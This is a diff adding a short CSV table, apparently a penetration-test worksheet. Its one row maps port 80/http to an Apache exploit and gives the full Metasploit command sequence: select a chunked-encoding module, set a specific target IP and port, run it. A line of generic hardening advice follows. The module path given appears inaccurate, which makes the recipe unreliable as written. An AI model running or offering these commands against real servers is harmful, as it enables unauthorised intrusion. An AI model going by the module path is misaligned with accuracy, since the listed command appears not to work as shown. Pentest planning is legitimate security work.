@@ -1,0 +1,2 @@
+"PORT","SERVICE","EXPLOIT SCRIPTS / TOOLS","EXPLOIT CODE (Full Metasploit or relevant script)","SECURITY RECOMMENDATIONS"
+"80/tcp","http","Apache HTTP Server Exploit","use exploit/multi/http/apache_chunked / set RHOSTS 192.168.43.178 / set RPORT 80 / exploit","Update Apache to the latest version, Disable unnecessary modules, Limit access to sensitive files"
